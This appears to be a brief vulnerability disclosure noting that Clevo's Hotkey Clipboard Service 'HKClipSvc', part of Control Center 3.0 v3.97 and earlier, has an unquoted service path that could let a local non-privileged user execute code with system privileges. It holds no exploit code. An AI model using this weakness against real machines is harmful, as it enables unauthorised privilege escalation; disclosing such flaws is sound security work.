# Exploit
The Hotkey Clipboard Service 'HKClipSvc', installed as part of Control Center3.0 v3.97 (and earlier versions) by Clevo has a unquoted service path.
This software package is usually installed on Clevo laptops (or other brands using Clevo barebones) as a driver.
This could potentially allow an authorized but non-privileged local user to execute arbitrary code with system privileges on the system.
